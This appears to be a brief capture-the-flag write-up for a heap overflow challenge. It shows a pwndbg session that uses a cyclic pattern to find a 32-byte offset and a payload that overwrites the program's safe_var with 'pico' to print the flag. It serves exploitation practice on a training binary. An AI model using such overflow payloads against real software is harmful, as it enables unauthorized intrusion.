
```bash
gdb chall

pwndbg> cyclic 200
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
pwndbg> r

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5555555596b0  ->   pico
+-------------+----------------+
[*]   0x5555555596d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 2               
Data for buffer: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = eaaaaaaafaaaaaaagaaaaaaahaaaaaaa3
aaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
```

removing all after `eaaaaaaafaaaaaaagaaaaaaahaaaaaaa`

we get aaaaaaaabaaaaaaacaaaaaaadaaaaaaa so using 

aaaaaaaabaaaaaaacaaaaaaadaaaaaaapico

to set safe_var to pico

opt `2`

aaaaaaaabaaaaaaacaaaaaaadaaaaaaapico

opt `3`

opt `4`
